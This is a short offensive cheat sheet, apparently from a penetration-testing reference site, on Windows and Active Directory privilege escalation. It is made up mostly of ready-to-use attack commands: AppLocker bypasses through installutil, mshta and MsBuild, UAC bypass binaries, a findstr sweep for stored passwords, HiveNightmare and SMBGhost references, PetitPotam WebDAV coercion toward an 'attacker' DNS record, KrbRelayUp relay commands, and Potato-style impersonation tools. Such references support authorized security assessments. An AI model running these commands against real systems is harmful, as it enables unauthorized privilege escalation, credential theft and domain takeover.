---
title: "Low access (Privilege escalation)"
description: "Low access (Privilege escalation) techniques and commands for Active Directory security assessment."
---
# Low access (Privilege escalation)
## Bypass Applocker *Low access (without applocker)*{: .highlight}
- Get-Applocker infos
  - `Get-ChildItem -Path HKLM:\SOFTWARE\Policies \Microsoft\Windows\SrpV2\Exe (dll/msi/...)`
- files in writables paths
  - C:\Windows\Temp
  - C:\Windows\Tasks
- `installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe`
- `mshta.exe my.hta`
- `MsBuild.exe pshell.xml`

## UAC bypass *Admin*{: .highlight}
- `Fodhelper.exe`
- `wsreset.exe`
- `msdt.exe`

## Auto Enum *Admin*{: .highlight}
- `winPEASany_ofs.exe`
- `.\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"`

## Search files *User Account*{: .highlight}
- `findstr /si 'pass' *.txt *.xml *.docx *.ini`

## Exploit *Admin*{: .highlight}
- SMBGhost CVE-2020-0796 @CVE@
- CVE-2021-36934 (HiveNightmare/SeriousSAM) @CVE@
  - `vssadmin list shadows`

## Webdav *HTTP Coerce*{: .highlight}
- open file <file>.searchConnector-ms
  - `dnstool.py -u <domain>\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>`
    - `petitpotam.py -u '<user>' -p <pass> -d '<domain>' "attacker@80/random.txt" <ip>`

## Kerberos Relay *Admin*{: .highlight}
- `KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>`
  - `KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>`

## From Service account (SEImpersonate) *Admin*{: .highlight}
- RoguePatato @CVE@
- GodPotato @CVE@
- PrintSpoofer @CVE@
- RemotePotato0